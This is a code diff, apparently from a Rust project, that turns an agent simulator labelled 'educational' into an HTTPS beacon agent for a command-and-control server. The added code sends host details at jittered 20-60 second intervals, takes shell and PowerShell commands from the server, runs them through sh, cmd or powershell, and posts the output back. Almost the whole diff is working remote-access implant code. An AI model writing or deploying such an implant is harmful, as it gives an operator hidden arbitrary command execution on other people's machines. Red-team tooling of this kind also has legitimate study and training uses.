@@ -1,19 +1,39 @@
-use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
-use futures_util::{StreamExt, SinkExt};
+use reqwest::Client;
 use serde_json::{json, Value};
 use uuid::Uuid;
 use std::fs;
 use std::time::Duration;
-use sysinfo::System;
+use tokio::time::sleep;
+use rand::Rng;
+use std::process::Command;
 
-mod auth;
-mod heartbeat;
-mod reconnect;
 mod system_info;
+
+#[derive(Serialize)]
+struct BeaconPayload {
+    id: String,
+    status: String,
+    hostname: String,
+    os: String,
+}
+
+#[derive(Deserialize)]
+struct BeaconResponse {
+    success: bool,
+    timestamp: String,
+    commands: Vec<PendingCommand>,
+}
+
+#[derive(Deserialize, Clone)]
+struct PendingCommand {
+    id: String,
+    command_type: String,
+    payload: String,
+}
 
 #[tokio::main]
 async fn main() {
-    println!("Educational Agent Simulator starting...");
+    println!("Educational HTTPS Beacon Agent starting...");
 
     // Get or create persistent Agent ID
     let agent_id = get_or_create_agent_id();
@@ -23,173 +43,156 @@ async fn main() {
     let os = system_info::get_os_name();
     println!("Host: {}, OS: {}", hostname, os);
 
-    let ws_url = std::env::var("C2_SERVER_WS_URL")
-        .unwrap_or_else(|_| "ws://localhost:3000/api/agent/ws".to_string());
+    // Get server URL from env or default
+    let server_url = std::env::var("C2_SERVER_URL")
+        .unwrap_or_else(|_| "http://localhost:3000".to_string());
+    
+    // Get auth token (in production, load from secure storage or config)
+    let auth_token = std::env::var("C2_AGENT_TOKEN")
+        .unwrap_or_else(|_| "default-token-change-me".to_string());
 
-    let mut backoff = reconnect::ReconnectBackoff::new();
+    println!("Beacon server: {}", server_url);
+    println!("Starting beacon loop with 20-60s jitter...");
+
+    let client = Client::builder()
+        .timeout(Duration::from_secs(30))
+        .build()
+        .expect("Failed to create HTTP client");
 
     loop {
-        println!("Connecting to C2 server at {}...", ws_url);
-        match connect_async(&ws_url).await {
-            Ok((ws_stream, _)) => {
-                println!("Connected to C2 server!");
-                backoff.reset();
+        // Calculate jitter: random sleep between 20-60 seconds
+        let jitter = rand::thread_rng().gen_range(20..=60);
+        
+        // Prepare beacon payload
+        let payload = BeaconPayload {
+            id: agent_id.clone(),
+            status: "alive".to_string(),
+            hostname: hostname.clone(),
+            os: os.clone(),
+        };
 
-                let (mut ws_sender, mut ws_receiver) = ws_stream.split();
-
-                // 1. Send REGISTER message
-                let register_msg = json!({
-                    "type": "Register",
-                    "payload": {
-                        "agent_id": agent_id,
-                        "hostname": hostname,
-                        "os": os
+        // Send beacon
+        let beacon_url = format!("{}/api/beacon", server_url);
+        match client
+            .post(&beacon_url)
+            .header("Authorization", format!("Bearer {}", auth_token))
+            .json(&payload)
+            .send()
+            .await
+        {
+            Ok(response) => {
+                if response.status().is_success() {
+                    match response.json::<BeaconResponse>().await {
+                        Ok(beacon_resp) => {
+                            if beacon_resp.success {
+                                println!("Beacon accepted at {}", beacon_resp.timestamp);
+                                
+                                // Process any commands received
+                                for cmd in beacon_resp.commands {
+                                    println!("Received command {}: {}", cmd.id, cmd.command_type);
+                                    execute_command(&client, &server_url, &agent_id, &auth_token, cmd).await;
+                                }
+                            }
+                        }
+                        Err(e) => {
+                            eprintln!("Failed to parse beacon response: {}", e);
+                        }
                     }
-                });
-
-                if let Err(e) = ws_sender.send(Message::Text(register_msg.to_string())).await {
-                    println!("Failed to send register message: {:?}", e);
-                    continue;
+                } else {
+                    eprintln!("Beacon rejected: HTTP {}", response.status());
                 }
-
-                // 2. Wait for CHALLENGE message
-                let nonce = match ws_receiver.next().await {
-                    Some(Ok(Message::Text(txt))) => {
-                        match serde_json::from_str::<Value>(&txt) {
-                            Ok(val) if val["type"] == "Challenge" => {
-                                val["payload"]["nonce"].as_str().unwrap_or("").to_string()
-                            }
-                            _ => {
-                                println!("Unexpected response during registration");
-                                continue;
-                            }
-                        }
-                    }
-                    _ => {
-                        println!("Connection closed during registration");
-                        continue;
-                    }
-                };
-
-                // 3. Solve challenge and send PROOF message
-                let proof_signature = auth::solve_challenge(&nonce);
-                let proof_msg = json!({
-                    "type": "Proof",
-                    "payload": {
-                        "signature": proof_signature
-                    }
-                });
-
-                if let Err(e) = ws_sender.send(Message::Text(proof_msg.to_string())).await {
-                    println!("Failed to send proof message: {:?}", e);
-                    continue;
-                }
-
-                // 4. Wait for AUTH_OK or AUTH_FAIL
-                match ws_receiver.next().await {
-                    Some(Ok(Message::Text(txt))) => {
-                        match serde_json::from_str::<Value>(&txt) {
-                            Ok(val) if val["type"] == "AuthOk" => {
-                                println!("Handshake completed. Authenticated successfully!");
-                            }
-                            Ok(val) if val["type"] == "AuthFail" => {
-                                println!("Authentication failed by server: {}", val["payload"]["reason"]);
-                                tokio::time::sleep(Duration::from_secs(5)).await;
-                                continue;
-                            }
-                            _ => {
-                                println!("Unexpected response during authentication");
-                                continue;
-                            }
-                        }
-                    }
-                    _ => {
-                        println!("Connection closed during authentication");
-                        continue;
-                    }
-                }
-
-                // Spawning periodic heartbeat and system info tasks
-                let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<Message>();
-                
-                let mut ws_write_task = tokio::spawn(async move {
-                    while let Some(msg) = rx.recv().await {
-                        if ws_sender.send(msg).await.is_err() {
-                            break;
-                        }
-                    }
-                });
-
-                let tx_heartbeat = tx.clone();
-                let agent_id_heartbeat = agent_id.clone();
-                let mut heartbeat_task = tokio::spawn(async move {
-                    let mut interval = tokio::time::interval(Duration::from_secs(5));
-                    loop {
-                        interval.tick().await;
-                        let payload = heartbeat::generate_heartbeat_payload(&agent_id_heartbeat);
-                        let msg = Message::Text(payload.to_string());
-                        if tx_heartbeat.send(msg).is_err() {
-                            break;
-                        }
-                    }
-                });
-
-                let tx_metrics = tx.clone();
-                let agent_id_metrics = agent_id.clone();
-                let mut metrics_task = tokio::spawn(async move {
-                    let mut interval = tokio::time::interval(Duration::from_secs(3));
-                    let mut local_sys = System::new_all();
-                    loop {
-                        interval.tick().await;
-                        let metrics = system_info::get_system_metrics(&mut local_sys);
-                        let metrics_payload = json!({
-                            "type": "SystemInfo",
-                            "payload": {
-                                "agent_id": agent_id_metrics,
-                                "cpu_usage": metrics.cpu_usage,
-                                "memory_usage": metrics.memory_usage,
-                                "disk_usage": metrics.disk_usage
-                            }
-                        });
-                        let msg = Message::Text(metrics_payload.to_string());
-                        if tx_metrics.send(msg).is_err() {
-                            break;
-                        }
-                    }
-                });
-
-                let mut ws_read_task = tokio::spawn(async move {
-                    while let Some(result) = ws_receiver.next().await {
-                        match result {
-                            Ok(Message::Close(_)) | Err(_) => {
-                                break;
-                            }
-                            _ => {} 
-                        }
-                    }
-                });
-
-                tokio::select! {
-                    _ = &mut ws_write_task => println!("WebSocket write loop exited"),
-                    _ = &mut ws_read_task => println!("WebSocket read loop exited"),
-                    _ = &mut heartbeat_task => println!("Heartbeat loop exited"),
-                    _ = &mut metrics_task => println!("Metrics loop exited"),
-                }
-
-                ws_write_task.abort();
-                ws_read_task.abort();
-                heartbeat_task.abort();
-                metrics_task.abort();
-
-                println!("Disconnected. Attempting reconnection...");
             }
             Err(e) => {
-                println!("Connection error: {:?}", e);
-                let delay = backoff.next_delay();
-                println!("Sleeping for {:?} before retrying...", delay);
-                tokio::time::sleep(delay).await;
+                eprintln!("Beacon failed: {}", e);
             }
         }
+
+        println!("Sleeping for {} seconds before next beacon...", jitter);
+        sleep(Duration::from_secs(jitter)).await;
+    }
+}
+
+async fn execute_command(
+    client: &Client, 
+    server_url: &str, 
+    agent_id: &str,
+    auth_token: &str,
+    cmd: PendingCommand,
+) {
+    println!("Executing command {}: {}", cmd.id, cmd.payload);
+    
+    let output = match cmd.command_type.as_str() {
+        "shell" | "bash" | "cmd" => execute_shell(&cmd.payload),
+        "powershell" => execute_powershell(&cmd.payload),
+        _ => format!("Unknown command type: {}", cmd.command_type),
+    };
+
+    println!("Command {} output (first 100 chars): {}", cmd.id, 
+             if output.len() > 100 { &output[..100] } else { &output });
+
+    // Send result back to server
+    let result_url = format!("{}/api/result", server_url);
+    let result_payload = json!({
+        "agent_id": agent_id,
+        "command_id": cmd.id,
+        "output": output,
+        "status": "completed"
+    });
+
+    match client
+        .post(&result_url)
+        .header("Authorization", format!("Bearer {}", auth_token))
+        .json(&result_payload)
+        .send()
+        .await
+    {
+        Ok(resp) => {
+            if resp.status().is_success() {
+                println!("Result for command {} sent successfully", cmd.id);
+            } else {
+                eprintln!("Failed to send result: HTTP {}", resp.status());
+            }
+        }
+        Err(e) => {
+            eprintln!("Failed to send result: {}", e);
+        }
+    }
+}
+
+fn execute_shell(command: &str) -> String {
+    let output = if cfg!(target_os = "windows") {
+        Command::new("cmd")
+            .args(&["/C", command])
+            .output()
+    } else {
+        Command::new("sh")
+            .args(&["-c", command])
+            .output()
+    };
+
+    match output {
+        Ok(out) => {
+            let stdout = String::from_utf8_lossy(&out.stdout);
+            let stderr = String::from_utf8_lossy(&out.stderr);
+            let exit_code = out.status.code().unwrap_or(-1);
+            format!("Exit code: {}\n\nSTDOUT:\n{}\n\nSTDERR:\n{}", exit_code, stdout, stderr)
+        }
+        Err(e) => format!("Failed to execute command: {}", e),
+    }
+}
+
+fn execute_powershell(command: &str) -> String {
+    let output = Command::new("powershell")
+        .args(&["-Command", command])
+        .output();
+    
+    match output {
+        Ok(out) => {
+            let stdout = String::from_utf8_lossy(&out.stdout);
+            let stderr = String::from_utf8_lossy(&out.stderr);
+            format!("STDOUT:\n{}\n\nSTDERR:\n{}", stdout, stderr)
+        }
+        Err(e) => format!("Failed to execute PowerShell: {}", e),
     }
 }
 
